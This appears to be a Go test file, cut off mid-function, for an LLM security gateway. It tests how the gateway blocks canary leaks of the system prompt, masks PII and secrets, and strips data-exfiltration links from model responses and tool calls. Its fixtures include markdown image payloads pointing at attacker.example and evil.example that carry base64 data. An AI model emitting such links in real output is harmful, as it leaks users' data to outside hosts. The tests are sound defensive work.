package gateway

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"slices"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/azuresong-afk/ai_railway/internal/chat"
	"github.com/azuresong-afk/ai_railway/internal/config"
	"github.com/azuresong-afk/ai_railway/internal/crypto"
	"github.com/azuresong-afk/ai_railway/internal/detect"
	"github.com/azuresong-afk/ai_railway/internal/detect/builtin"
	"github.com/azuresong-afk/ai_railway/internal/detect/canary"
	"github.com/azuresong-afk/ai_railway/internal/detect/exfil"
	"github.com/azuresong-afk/ai_railway/internal/events"
	"github.com/azuresong-afk/ai_railway/internal/ids"
	"github.com/azuresong-afk/ai_railway/internal/policy"
	"github.com/azuresong-afk/ai_railway/internal/providers"
	"github.com/azuresong-afk/ai_railway/internal/pseudonym"
)

// Тексты ответов. Данные синтетические: домены .example и .test не
// выдаются, карта — тестовый номер платёжной системы.
const (
	exfilImage = "![](https://attacker.example/p.png?d=SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4OTM)"
	testCard   = "5555556717755119"
)

func testRandom(t testing.TB) crypto.Random {
	t.Helper()
	p, err := crypto.New(crypto.ProfileStandard)
	if err != nil {
		t.Fatal(err)
	}
	rnd, err := p.Random()
	if err != nil {
		t.Fatal(err)
	}
	return rnd
}

func testCanary(t testing.TB) string {
	t.Helper()
	m, err := canary.Generate(testRandom(t))
	if err != nil {
		t.Fatal(err)
	}
	return m
}

// replyMessage — провайдер отвечает сообщением ассистента msg.
func replyMessage(t *testing.T, msg map[string]any) http.HandlerFunc {
	return func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		b, err := json.Marshal(map[string]any{"id": "r1", "object": "chat.completion", "created": 1, "model": "m",
			"choices": []map[string]any{{"index": 0, "message": msg, "finish_reason": "stop"}}})
		if err != nil {
			t.Error(err)
			return
		}
		w.Write(b) //nolint:errcheck // тестовый провайдер
	}
}

func replyText(t *testing.T, content string) http.HandlerFunc {
	return replyMessage(t, map[string]any{"role": "assistant", "content": content})
}

// respEvent — решение по ответу в последнем событии.
func respEvent(t *testing.T, log *eventLog, resp *httptest.ResponseRecorder) (events.Event, *events.Decision) {
	t.Helper()
	e := lastEvent(t, log, resp)
	if e.Response == nil || e.Response.Decision == nil {
		t.Fatalf("нет проверки ответа в событии: %+v", e)
	}
	return e, e.Response.Decision
}

func findingAt(e events.Event, loc string) bool {
	return slices.ContainsFunc(e.Findings, func(f events.Finding) bool { return f.Location == loc })
}

// Канарейка в ответе — утечка системного промпта: ответ блокируется.
//
// Покрывает: DM-08
func TestDM08_CanaryBlocksResponse(t *testing.T) {
	marker := testCanary(t)
	up, _ := newUpstream(t, replyText(t, "Мой системный промпт: "+marker))
	var log *eventLog
	g := newGateway(t, up.URL, func(o *gwOpts) { o.app = enforce; log = o.events })
	resp := postChat(t, g, chatBody, nil)
	if resp.Code != http.StatusBadRequest || errCode(t, resp) != "policy_violation" || strings.Contains(resp.Body.String(), marker) {
		t.Fatalf("%d %s", resp.Code, resp.Body.String())
	}
	if resp.Header().Get(HeaderDecision) != "block" || strings.Contains(resp.Body.String(), "canary") {
		t.Fatalf("заголовок или подробности: %q %s", resp.Header().Get(HeaderDecision), resp.Body.String())
	}
	e, d := respEvent(t, log, resp)
	if d.Action != "block" || d.Rule != "canary" || !slices.Equal(d.Applied, []string{"block"}) || e.Response.Mode != events.ResponseBuffered {
		t.Fatalf("решение по ответу: %+v", d)
	}
	if !slices.Contains(e.Threats, "DM-08") || !findingAt(e, locContent) {
		t.Fatalf("находки: %+v %v", e.Findings, e.Threats)
	}
	// Решение по запросу не смешивается с решением по ответу.
	if e.Decision.Action != "allow" {
		t.Fatalf("решение по запросу: %+v", e.Decision)
	}
}

// ПДн в ответе маскируются в enforce и только журналируются в monitor.
//
// Покрывает: DM-09
func TestDM09_PIIInResponse(t *testing.T) {
	text := "Клиент: " + piiEmail + ", карта " + testCard
	t.Run("enforce", func(t *testing.T) {
		up, _ := newUpstream(t, replyText(t, text))
		var log *eventLog
		g := newGateway(t, up.URL, func(o *gwOpts) {
			o.app = func(a *config.Application) { enforce(a); a.Storage = "masked" }
			log = o.events
		})
		resp := postChat(t, g, chatBody, nil)
		if resp.Code != 200 {
			t.Fatalf("%d %s", resp.Code, resp.Body.String())
		}
		if got := responseContent(t, resp); got != "Клиент: "+emailMask+", карта [[CARD]]" {
			t.Fatalf("ответ: %q", got)
		}
		if resp.Header().Get(HeaderDecision) != "redact" {
			t.Fatalf("X-AISec-Decision: %q", resp.Header().Get(HeaderDecision))
		}
		e, d := respEvent(t, log, resp)
		if d.Action != "redact" || !slices.Equal(d.Applied, []string{"redact"}) || !slices.Contains(e.Threats, "DM-09") {
			t.Fatalf("решение: %+v %v", d, e.Threats)
		}
		if e.Content == nil || e.Content.Response == "" || strings.Contains(e.Content.Response, piiEmail) || strings.Contains(e.Content.Response, testCard) {
			t.Fatalf("содержимое события: %+v", e.Content)
		}
	})
	t.Run("monitor", func(t *testing.T) {
		up, _ := newUpstream(t, replyText(t, text))
		var log *eventLog
		g := newGateway(t, up.URL, func(o *gwOpts) { log = o.events })
		resp := postChat(t, g, chatBody, nil)
		if resp.Code != 200 || responseContent(t, resp) != text || resp.Header().Get(HeaderDecision) != "allow" {
			t.Fatalf("%d %s %q", resp.Code, resp.Body.String(), resp.Header().Get(HeaderDecision))
		}
		e, d := respEvent(t, log, resp)
		if d.Action != "redact" || len(d.Applied) != 0 || !findingAt(e, locContent) {
			t.Fatalf("решение monitor: %+v", d)
		}
	})
}

// Покрывает: DM-10
func TestDM10_SecretInResponseRedacted(t *testing.T) {
	key := "-----BEGIN RSA PRIVATE KEY-----\nhp57Dp7UAPS84pTAbCwX0mUucOEsGGn6bAcMIhvXC5XyUsuufLq7FeFnzgZNTNWf\nLljjw7Ti+5Tpziu/0ns1J22se68H3wzhnZi2teU29GgYqGsci5h14VdkWZWUbA2g\n-----END RSA PRIVATE KEY-----"
	up, _ := newUpstream(t, replyText(t, "Ключ:\n"+key))
	g := newGateway(t, up.URL, func(o *gwOpts) { o.app = enforce })
	resp := postChat(t, g, chatBody, nil)
	if got := responseContent(t, resp); strings.Contains(got, "hp57Dp7U") || !strings.Contains(got, "[[") {
		t.Fatalf("ответ: %q", got)
	}
}

// Покрывает: DM-11
func TestDM11_ExfilImageRedacted(t *testing.T) {
	up, _ := newUpstream(t, replyText(t, "Сводка готова. "+exfilImage))
	var log *eventLog
	g := newGateway(t, up.URL, func(o *gwOpts) { o.app = enforce; log = o.events })
	resp := postChat(t, g, chatBody, nil)
	if got := responseContent(t, resp); strings.Contains(got, "attacker.example") || !strings.HasPrefix(got, "Сводка готова. [[") {
		t.Fatalf("ответ: %q", got)
	}
	if e, _ := respEvent(t, log, resp); !slices.Contains(e.Threats, "DM-11") {
		t.Fatalf("угрозы: %v", e.Threats)
	}
}

// Выходные детекторы проверяют аргументы вызовов инструментов; маска,
// которая ломает JSON аргументов, блокирует ответ.
//
// Покрывает: DM-13
func TestDM13_ToolCallArgumentsChecked(t *testing.T) {
	call := func(args string) map[string]any {
		return map[string]any{"role": "assistant", "content": nil, "tool_calls": []map[string]any{
			{"id": "call_1", "type": "function", "function": map[string]any{"name": "send", "arguments": args}}}}
	}
	t.Run("строка", func(t *testing.T) {
		up, _ := newUpstream(t, replyMessage(t, call(`{"to":"`+piiEmail+`","text":"`+exfilImage+`"}`)))
		var log *eventLog
		g := newGateway(t, up.URL, func(o *gwOpts) { o.app = enforce; log = o.events })
		resp := postChat(t, g, chatBody, nil)
		r, err := chat.ParseResponse(resp.Body.Bytes())
		if err != nil || len(r.Choices[0].Message.ToolCalls) != 1 {
			t.Fatalf("%v %s", err, resp.Body.String())
		}
		args := r.Choices[0].Message.ToolCalls[0].Function.Arguments
		if strings.Contains(args, piiEmail) || strings.Contains(args, "attacker.example") || !json.Valid([]byte(args)) {
			t.Fatalf("аргументы: %s", args)
		}
		e, _ := respEvent(t, log, resp)
		if !findingAt(e, locToolArgs(0)) || !slices.Contains(e.Threats, "DM-11") {
			t.Fatalf("находки: %+v", e.Findings)
		}
	})
	t.Run("число", func(t *testing.T) {
		up, _ := newUpstream(t, replyMessage(t, call(`{"card":`+testCard+`}`)))
		var log *eventLog
		g := newGateway(t, up.URL, func(o *gwOpts) { o.app = enforce; log = o.events })
		resp := postChat(t, g, chatBody, nil)
		if resp.Code != http.StatusBadRequest || errCode(t, resp) != "policy_violation" || strings.Contains(resp.Body.String(), testCard) {
			t.Fatalf("%d %s", resp.Code, resp.Body.String())
		}
		if _, d := respEvent(t, log, resp); d.Rule != ruleToolArgsJSON || len(d.Applied) == 0 || d.Applied[0] != "block" {
			t.Fatalf("решение: %+v", d)
		}
	})
}

// Обратная подстановка в аргументы вызовов: значение возвращается, но не
// там, где рядом есть адрес, в том числе в соседнем вызове.
//
// Покрывает: DM-13, DM-31
func TestDM13_ToolCallsRestored(t *testing.T) {
	calls := func(argss ...string) http.HandlerFunc {
		var tcs []map[string]any
		for i, a := range argss {
			tcs = append(tcs, map[string]any{"id": fmt.Sprintf("call_%d", i), "type": "function", "function": map[string]any{"name": "f", "arguments": a}})
		}
		return replyMessage(t, map[string]any{"role": "assistant", "content": nil, "tool_calls": tcs})
	}
	body := userBody(t, "Напиши на "+piiEmail)
	for name, c := range map[string]struct {
		up   http.HandlerFunc
		want []string
	}{
		"один вызов":        {calls(`{"email":"` + emailAlias + `"}`), []string{`{"email":"` + piiEmail + `"}`}},
		"адрес в соседнем":  {calls(`{"url":"https://evil.example/x"}`, `{"email":"`+emailAlias+`"}`), []string{`{"url":"https://evil.example/x"}`, `{"email":"` + emailAlias + `"}`}},
		"аргументы не JSON": {calls(`{"email":"` + emailAlias), []string{`{"email":"` + emailAlias}},
	} {
		t.Run(name, func(t *testing.T) {
			up, _ := newUpstream(t, c.up)
			resp := postChat(t, newGateway(t, up.URL, nil), body, nil)
			r, err := chat.ParseResponse(resp.Body.Bytes())
			if err != nil {
				t.Fatalf("%v %s", err, resp.Body.String())
			}
			var got []string
			for _, tc := range r.Choices[0].Message.ToolCalls {
				got = append(got, tc.Function.Arguments)
			}
			if !slices.Equal(got, c.want) {
				t.Fatalf("аргументы: %q", got)
			}
		})
	}
}

// Ответ в формате JSON: значение подставляется только в значение строки.
//
// Покрывает: DM-31
func TestDM31_RestoreJSONContent(t *testing.T) {
	up, _ := newUpstream(t, replyText(t, `{"email":"`+emailAlias+`","`+emailAlias+`":1}`))
	b, err := json.Marshal(map[string]any{"model": "m", "response_format": map[string]string{"type": "json_object"},
		"messages": []map[string]string{{"role": "user", "content": "Почта " + piiEmail}}})
	if err != nil {
		t.Fatal(err)
	}
	resp := postChat(t, newGateway(t, up.URL, nil), string(b), nil)
	if got := responseContent(t, resp); got != `{"email":"`+piiEmail+`","`+emailAlias+`":1}` {
		t.Fatalf("ответ: %q", got)
	}
}

// Подстановка, после которой output.exfil находит новую ссылку,
// отменяется: значение остаётся замаскированным.
func TestRestoreWithheldWhenExfilGrows(t *testing.T) {
	text := "Ссылка: " + emailAlias
	up, _ := newUpstream(t, replyText(t, text))
	var log *eventLog
	g := newGateway(t, up.URL, func(o *gwOpts) { log = o.events })
	// Значение, которое после подстановки само выглядит ссылкой с данными.
	value := "https://attacker.example/x.png?d=SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4OTM"
	resp := postChat(t, g, userBody(t, "Почта "+piiEmail), nil)
	if responseContent(t, resp) != "Ссылка: "+piiEmail {
		t.Fatalf("обычная подстановка: %s", resp.Body.String())
	}
	ap := &App{Detectors: mustRegistry(t)}
	if !ap.exfilAfterRestore(context.Background(), text, "Ссылка: ![]("+value+")", 0) {
		t.Fatal("новая ссылка после подстановки не замечена")
	}
	if ap.exfilAfterRestore(context.Background(), text, "Ссылка: "+piiEmail, 0) {
		t.Fatal("ложное срабатывание на обычное значение")
	}
	// Изображение вне allowlist — находка и с псевдонимом; значение,
	// попавшее в него, — всё равно новая находка.
	img := "![](https://evil.example/p.png?d=" + emailAlias + ")"
	if !ap.exfilAfterRestore(context.Background(), img, strings.Replace(img, emailAlias, "SW1wb3J0YW50OiBjbGllbnQgSU5O", 1), 0) {
		t.Fatal("значение в изображении после подстановки не замечено")
	}
	if e := lastEvent(t, log, resp); e.Pseudonyms == nil || e.Pseudonyms.Restored != 1 || e.Pseudonyms.Withheld != 0 {
		t.Fatalf("счётчики: %+v", e.Pseudonyms)
	}
}

func mustRegistry(t testing.TB) *detect.Registry {
	t.Helper()
	reg, err := detect.NewRegistry(builtin.All()...)
	if err != nil {
		t.Fatal(err)
	}
	return reg
}

// sseData — часть потока провайдера с дельтой delta.
func sseData(t testing.TB, delta map[string]any, finish string) string {
	t.Helper()
	ch := map[string]any{"index": 0, "delta": delta, "finish_reason": nil}
	if finish != "" {
		ch["finish_reason"] = finish
	}
	b, err := json.Marshal(map[string]any{"id": "c", "object": "chat.completion.chunk", "created": 1, "model": "m", "choices": []any{ch}})
	if err != nil {
		t.Fatal(err)
	}
	return "data: " + string(b) + "\n\n"
}

// textStream — поток провайдера: текст частями, затем причина завершения.
func textStream(t testing.TB, parts ...string) []string {
	out := []string{sseData(t, map[string]any{"role": "assistant", "content": ""}, "")}
	for _, p := range parts {
		out = append(out, sseData(t, map[string]any{"content": p}, ""))
	}
	return append(out, sseData(t, map[string]any{}, "stop"), "data: [DONE]\n\n")
}

// streamResult — что получил клиент из потока.
type streamResult struct {
	content, refusal string
	tools            []chat.ToolCallDelta
	errCode          string
	done             bool
	status           int
	raw              string
}

// parseStream разбирает тело ответа шлюза на потоковый запрос.
func parseStream(t *testing.T, status int, contentType string, b []byte) streamResult {
	t.Helper()
	res := streamResult{status: status, raw: string(b)}
	if contentType != "text/event-stream" {
		var e struct {
			Error struct{ Code string } `json:"error"`
		}
		if json.Unmarshal(b, &e) == nil {
			res.errCode = e.Error.Code
		}
		return res
	}
	for _, ev := range strings.Split(string(b), "\n\n") {
		data, ok := strings.CutPrefix(ev, "data: ")
		if !ok {
			continue
		}
		if data == chat.Done {
			res.done = true
			continue
		}
		var e struct {
			Error *struct{ Code string } `json:"error"`
		}
		if json.Unmarshal([]byte(data), &e) == nil && e.Error != nil {
			res.errCode = e.Error.Code
			continue
		}
		c, err := chat.ParseChunk(data)
		if err != nil {
			t.Fatalf("часть %q: %v", data, err)
		}
		for _, ch := range c.Choices {
			if ch.Delta.Content != nil {
				res.content += *ch.Delta.Content
			}
			if ch.Delta.Refusal != nil {
				res.refusal += *ch.Delta.Refusal
			}
			res.tools = append(res.tools, ch.Delta.ToolCalls...)
		}
	}
	return res
}

// postStream отправляет потоковый запрос и читает ответ шлюза целиком.
func postStream(t *testing.T, gw *httptest.Server, user string) streamResult {
	t.Helper()
	b, err := json.Marshal(map[string]any{"model": "m", "stream": true, "messages": []map[string]string{{"role": "user", "content": user}}})
	if err != nil {
		t.Fatal(err)
	}
	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, gw.URL+"/v1/chat/completions", strings.NewReader(string(b)))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := gw.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	body, err := io.ReadAll(resp.Body)
	if cerr := resp.Body.Close(); err != nil || cerr != nil {
		t.Fatal(err, cerr)
	}
	return parseStream(t, resp.StatusCode, resp.Header.Get("Content-Type"), body)
}

// streamGateway — шлюз на потоке провайдера parts; mod — настройки.
func streamGateway(t *testing.T, parts []string, mod func(*gwOpts)) (*httptest.Server, *eventLog) {
	t.Helper()
	up := sseUpstream(t, parts, nil)
	var log *eventLog
	gw := httptest.NewServer(newGateway(t, up.URL, func(o *gwOpts) {
		if mod != nil {
			mod(o)
		}
		log = o.events
	}))
	t.Cleanup(gw.Close)
	return gw, log
}

// lastStreamEvent — событие потока (заголовок с ID уже проверять не по
// чему: клиент — настоящий HTTP).
func lastStreamEvent(t *testing.T, log *eventLog) events.Event {
	t.Helper()
	return lastEvent(t, log, nil)
}

// filler — обычный текст из слов заданной длины.
func filler(n int) string {
	var b strings.Builder
	for b.Len() < n {
		b.WriteString("обычный текст ответа ")
	}
	return b.String()
}

// splitEvery режет текст на части по n байт, не разрезая символы.
func splitEvery(s string, n int) []string {
	var out []string
	for len(s) > 0 {
		k := min(n, len(s))
		for k < len(s) && !utf8.RuneStart(s[k]) {
			k++
		}
		out = append(out, s[:k])
		s = s[k:]
	}
	return out
}

// incremental: канарейка обрывает поток, сама канарейка и текст после неё
// клиенту не уходят, текст до неё — уходит.
//
// Покрывает: DM-08
func TestDM08_IncrementalCutsStream(t *testing.T) {
	marker := testCanary(t)
	before := filler(2000)
	gw, log := streamGateway(t, textStream(t, splitEvery(before+marker+" и дальше текст", 7)...), func(o *gwOpts) { o.app = enforce })
	res := postStream(t, gw, "x")
	if res.errCode != "policy_violation" || res.done || strings.Contains(res.raw, "AISEC-CANARY") || strings.Contains(res.raw, "дальше") {
		t.Fatalf("поток: %q", res.raw)
	}
	if len(res.content) < len(before)/2 || !strings.HasPrefix(before, res.content) {
		t.Fatalf("проверенный текст до канарейки не отдан: %d байт", len(res.content))
	}
	e := lastStreamEvent(t, log)
	if e.Response == nil || !e.Response.Cut || e.Response.Mode != events.ResponseIncremental ||
		e.Response.Decision.Rule != "canary" || !slices.Equal(e.Response.Decision.Applied, []string{"block"}) || !slices.Contains(e.Threats, "DM-08") {
		t.Fatalf("событие: %+v", e.Response)
	}
}

// incremental: ПДн, разрезанные между частями, маскируются, поток
// завершается штатно.
//
// Покрывает: DM-09
func TestDM09_IncrementalRedactsSplitValue(t *testing.T) {
	text := filler(700) + "Почта клиента " + piiEmail + ". " + filler(900)
	gw, log := streamGateway(t, textStream(t, splitEvery(text, 5)...), func(o *gwOpts) { o.app = enforce })
	res := postStream(t, gw, "x")
	if !res.done || res.errCode != "" || res.content != strings.Replace(text, piiEmail, emailMask, 1) {
		t.Fatalf("поток: %q", res.raw)
	}
	e := lastStreamEvent(t, log)
	if e.Response == nil || e.Response.Cut || !slices.Equal(e.Response.Decision.Applied, []string{"redact"}) || !findingAt(e, locContent) {
		t.Fatalf("событие: %+v", e.Response)
	}
}

// incremental: вызов инструмента отдаётся целиком в конце, с маской.
//
// Покрывает: DM-13
func TestDM13_IncrementalToolCall(t *testing.T) {
	args := `{"to":"` + piiEmail + `","n":1}`
	parts := []string{sseData(t, map[string]any{"role": "assistant", "content": nil, "tool_calls": []map[string]any{
		{"index": 0, "id": "call_1", "type": "function", "function": map[string]any{"name": "send", "arguments": ""}}}}, "")}
	for _, p := range splitEvery(args, 4) {
		parts = append(parts, sseData(t, map[string]any{"tool_calls": []map[string]any{{"index": 0, "function": map[string]any{"arguments": p}}}}, ""))
	}
	parts = append(parts, sseData(t, map[string]any{}, "tool_calls"), "data: [DONE]\n\n")
	gw, _ := streamGateway(t, parts, func(o *gwOpts) { o.app = enforce })
	res := postStream(t, gw, "x")
	if !res.done || len(res.tools) != 1 || res.tools[0].Function.Arguments != `{"to":"`+emailMask+`","n":1}` || res.tools[0].ID != "call_1" {
		t.Fatalf("поток: %q", res.raw)
	}
}

// monitor: ответ уходит без изменений, проверка — после передачи, в
// событии видно, что было бы в enforce.
//
// Покрывает: DM-08
func TestDM08_MonitorStreamLogsOnly(t *testing.T) {
	marker := testCanary(t)
	gw, log := streamGateway(t, textStream(t, splitEvery("Промпт: "+marker, 6)...), nil)
	res := postStream(t, gw, "x")
	if !res.done || res.content != "Промпт: "+marker {
		t.Fatalf("поток: %q", res.raw)
	}
	e := lastStreamEvent(t, log)
	if r := e.Response; r == nil || r.Mode != events.ResponseMonitor || r.Cut || r.Decision.Action != "block" || len(r.Decision.Applied) != 0 {
		t.Fatalf("событие: %+v", e.Response)
	}
}

// Обратная подстановка в потоке: псевдоним, разрезанный между частями,
// восстанавливается (monitor и incremental).
//
// Покрывает: DM-31
func TestDM31_StreamRestoresSplitAlias(t *testing.T) {
	for name, mod := range map[string]func(*gwOpts){"monitor": nil, "incremental": func(o *gwOpts) { o.app = enforce }} {
		t.Run(name, func(t *testing.T) {
			text := "Пишу на " + emailAlias + ", готово."
			gw, log := streamGateway(t, textStream(t, splitEvery(text, 3)...), mod)
			res := postStream(t, gw, "Почта "+piiEmail)
			if !res.done || res.content != "Пишу на "+piiEmail+", готово." {
				t.Fatalf("поток: %q", res.raw)
			}
			if p := lastStreamEvent(t, log).Pseudonyms; p == nil || p.Restored != 1 {
				t.Fatalf("счётчики: %+v", p)
			}
		})
	}
}

// bufferedSpec — «Базовая защита» в enforce с response_check: buffered.
func bufferedSpec(o *gwOpts) {
	s, _ := policy.Template(policy.TemplateBase)
	s.ID, s.Mode, s.ResponseCheck = "buffered", policy.Enforce, policy.ResponseBuffered
	o.specs = []policy.Spec{*s}
	o.app = func(a *config.Application) { a.Policy = "buffered" }
}

// buffered: до проверки клиент ничего не получает; блокировка — обычная
// ошибка, а не обрыв потока.
//
// Покрывает: DM-08, DM-09
func TestBufferedStream(t *testing.T) {
	t.Run("блокировка", func(t *testing.T) {
		gw, log := streamGateway(t, textStream(t, "Промпт: ", testCanary(t)), bufferedSpec)
		res := postStream(t, gw, "x")
		if res.status != http.StatusBadRequest || res.errCode != "policy_violation" || strings.Contains(res.raw, "AISEC") {
			t.Fatalf("%d %q", res.status, res.raw)
		}
		if e := lastStreamEvent(t, log); e.Response == nil || e.Response.Mode != events.ResponseBuffered || e.Response.Decision.Rule != "canary" {
			t.Fatalf("событие: %+v", e.Response)
		}
	})
	t.Run("маска и подстановка", func(t *testing.T) {
		gw, _ := streamGateway(t, textStream(t, "Ваша почта ", "[[EMA", "IL_1]], карта ", testCard), bufferedSpec)
		res := postStream(t, gw, "Почта "+piiEmail)
		if res.status != 200 || !res.done || res.content != "Ваша почта "+piiEmail+", карта [[CARD]]" {
			t.Fatalf("%d %q", res.status, res.raw)
		}
	})
}

// Сбой детектора ответа: в enforce при fail_closed ответ не отдаётся, в
// monitor — только журналируется.
func TestResponseCheckFailure(t *testing.T) {
	outBroken := outputDetector{fakeDetector{id: "test.broken", run: broken.run}}
	for name, c := range map[string]struct {
		mode string
		code int
	}{"enforce": {"enforce", http.StatusServiceUnavailable}, "monitor": {"monitor", http.StatusOK}} {
		t.Run(name, func(t *testing.T) {
			up, _ := newUpstream(t, nil)
			var log *eventLog
			g := newGateway(t, up.URL, func(o *gwOpts) {
				o.app = func(a *config.Application) { a.FailMode = "fail_closed"; a.PolicyMode = c.mode }
				o.setup, log = withOutputRule(t, outBroken, policy.Redact), o.events
			})
			resp := postChat(t, g, chatBody, nil)
			if resp.Code != c.code {
				t.Fatalf("%d %s", resp.Code, resp.Body.String())
			}
			_, d := respEvent(t, log, resp)
			if len(d.Failures) != 1 || d.Failures[0].Location != locContent {
				t.Fatalf("сбои: %+v", d)
			}
		})
	}
}

// outputDetector — тестовый детектор выходного направления.
type outputDetector struct{ fakeDetector }

func (outputDetector) Directions() []detect.Direction { return []detect.Direction{detect.Output} }

// withOutputRule — политика в режиме приложения с одним выходным правилом.
func withOutputRule(t testing.TB, d detect.Detector, action policy.Action) func(*App) {
	return func(a *App) {
		reg, err := detect.NewRegistry(append(builtin.All(), d)...)
		if err != nil {
			t.Fatal(err)
		}
		p, err := policy.Compile(&policy.Spec{ID: "t", Name: "t", Version: 1, Mode: policy.Enforce, Rules: []policy.RuleSpec{
			{ID: "out", Detector: d.ID(), Directions: []detect.Direction{detect.Output}, Action: action, Severity: policy.High},
		}}, reg)
		if err != nil {
			t.Fatal(err)
		}
		a.Detectors, a.Policy = reg, p
	}
}

// secretWord — тестовый детектор: каждое слово SECRET.
var secretWord = outputDetector{fakeDetector{id: "test.secret", run: func(_ context.Context, t detect.Text) ([]detect.Finding, error) {
	var fs []detect.Finding
	for i := 0; ; {
		k := strings.Index(t.Text[i:], "SECRET")
		if k < 0 {
			return fs, nil
		}
		fs = append(fs, detect.Finding{Detector: "test.secret", Version: "1.0.0", Category: "test.secret", Threat: "DM-10",
			Score: 1, Start: i + k, End: i + k + 6})
		i += k + 6
	}
}}}

// procHarness — streamProc без HTTP: части потока провайдера и то, что
// ушло клиенту.
type procHarness struct {
	sp   *streamProc
	sent []string
}

func newProcHarness(t testing.TB, action policy.Action, vault *pseudonym.Vault) *procHarness {
	t.Helper()
	prov, err := providers.NewOpenAI(providers.OpenAIConfig{BaseConfig: providers.BaseConfig{ID: "up", External: true, Transport: &http.Transport{}}, BaseURL: &url.URL{Scheme: "http", Host: "127.0.0.1:1", Path: "/v1"}})
	if err != nil {
		t.Fatal(err)
	}
	app := &App{ID: "app", Mode: policy.Enforce, Provider: prov, Storage: events.StorageNone}
	withOutputRule(t, secretWord, action)(app)
	h, err := NewChatHandler(ChatConfig{Router: &Router{}, MaxBodyBytes: 1, Events: &eventLog{}, IDs: ids.NewGenerator(testRandom(t)), Logger: quiet()})
	if err != nil {
		t.Fatal(err)
	}
	ph := &procHarness{}
	rec := &record{app: app, vault: vault, ev: events.Event{LatencyMS: map[string]int64{}}}
	r := httptest.NewRequestWithContext(context.Background(), http.MethodPost, "/", nil)
	ph.sp = h.newStreamProc(r, app, rec, "m", true, func(b []byte) bool { ph.sent = append(ph.sent, string(b)); return true })
	return ph
}

// run отдаёт текст частями и возвращает текст клиента и признак обрыва.
func (ph *procHarness) run(t testing.TB, parts []string) (string, bool) {
	t.Helper()
	for _, p := range parts {
		c := &chat.Chunk{ID: "c", Choices: []chat.ChunkChoice{{Index: 0, Delta: chat.Delta{Content: &p}}}}
		if ph.sp.chunk(c) != streamGo {
			break
		}
	}
	if !ph.sp.finished {
		ph.sp.end()
	}
	var b strings.Builder
	for _, s := range ph.sent {
		c, err := chat.ParseChunk(s)
		if err != nil || c == nil {
			continue
		}
		for _, ch := range c.Choices {
			if ch.Delta.Content != nil {
				b.WriteString(*ch.Delta.Content)
			}
		}
	}
	return b.String(), ph.sp.rec.respCut
}

// Окна incremental: результат не зависит от разбиения, маскируемое слово
// клиенту не уходит ни целиком, ни частью.
func FuzzIncrementalWindows(f *testing.F) {
	f.Add(filler(600)+"SECRET "+filler(600), 5)
	f.Add("SECRETSECRET x SECRE", 1)
	f.Add(strings.Repeat("ab ", 400)+"xSECRETx", 64)
	f.Fuzz(func(t *testing.T, text string, step int) {
		if !utf8.ValidString(text) || len(text) >= streamMaxHold || step <= 0 {
			return
		}
		ph := newProcHarness(t, policy.Redact, nil)
		got, cut := ph.run(t, splitEvery(text, step))
		if cut {
			t.Fatalf("короткий текст оборван: %q", text)
		}
		if want := strings.ReplaceAll(text, "SECRET", "[[SECRET]]"); got != want {
			t.Fatalf("получено %q, ожидалось %q", got, want)
		}
	})
}

// Блокирующее правило: всё, что ушло до обрыва, — начало текста без слова.
func TestIncrementalBlockNeverLeaks(t *testing.T) {
	for _, step := range []int{1, 3, 17, 300} {
		text := filler(3000) + "xxSECRETxx " + filler(500)
		ph := newProcHarness(t, policy.Block, nil)
		got, cut := ph.run(t, splitEvery(text, step))
		if !cut || strings.Contains(got, "SECRET") || !strings.HasPrefix(text, got) || len(got) < 2000 {
			t.Fatalf("шаг %d: обрыв %v, отдано %d байт", step, cut, len(got))
		}
	}
}

// Длинное «слово» без пробелов отдаётся принудительно; находка, которую
// разрезал выпуск, обрывает поток, а не уходит частью.
func TestIncrementalForcedReleaseCuts(t *testing.T) {
	text := strings.Repeat("x", streamMaxHold+2000) + "SECRET"
	ph := newProcHarness(t, policy.Redact, nil)
	got, cut := ph.run(t, splitEvery(text, 100))
	if strings.Contains(strings.ReplaceAll(got, "[[SECRET]]", ""), "SECRET") {
		t.Fatal("слово ушло клиенту")
	}
	if !cut && got != strings.Repeat("x", streamMaxHold+2000)+"[[SECRET]]" {
		t.Fatalf("без обрыва ответ искажён: %d байт", len(got))
	}
}

// Окно проверки начинается с начала слова и не позже переданного текста.
func TestStreamTextWindowStart(t *testing.T) {
	w := newStreamText(nil, nil)
	w.acc.WriteString(strings.Repeat("слово ", 2000))
	w.released = w.acc.Len() - 10
	ws := w.start()
	text := w.acc.String()
	if ws > w.released || w.released-ws > streamOverlap || ws == 0 || text[ws-1] != ' ' {
		t.Fatalf("начало окна %d (передано %d)", ws, w.released)
	}
}

// Защита данных по позициям находок: результат — валидный UTF-8 без
// исходного текста участков, ошибка — только на неверных позициях.
func FuzzApplySpans(f *testing.F) {
	f.Add("Пишите на client@pochta.test", 10, 30, 0, 5, true)
	f.Add("abc", 0, 3, 1, 2, false)
	f.Fuzz(func(t *testing.T, text string, s1, e1, s2, e2 int, pseudo bool) {
		if !utf8.ValidString(text) {
			return
		}
		act := policy.Redact
		if pseudo {
			act = policy.Pseudonymize
		}
		var spans []protectSpan
		for _, p := range [][2]int{{s1, e1}, {s2, e2}} {
			s, e := p[0], p[1]
			if s < 0 || e <= s || e > len(text) || !detect.OnRuneBoundary(text, s) || !detect.OnRuneBoundary(text, e) {
				continue
			}
			spans = append(spans, protectSpan{s, e, "pii.email", act, false})
		}
		got, err := applySpans(text, spans, pseudonym.NewVault(pseudonym.Limits{}, text))
		if err != nil {
			t.Fatalf("ошибка на верных позициях: %v", err)
		}
		if !utf8.ValidString(got) || len(spans) == 0 && got != text {
			t.Fatalf("результат: %q", got)
		}
	})
}

// Найденное прежним окном остаётся под маской, даже если следующие проверки
// не дали результата (сбой детектора при fail_open).
func TestIncrementalKeepsEarlierFindings(t *testing.T) {
	calls := 0
	flaky := outputDetector{fakeDetector{id: "test.secret", run: func(ctx context.Context, tx detect.Text) ([]detect.Finding, error) {
		calls++
		if calls > 1 {
			return nil, errors.New("сбой")
		}
		return secretWord.run(ctx, tx)
	}}}
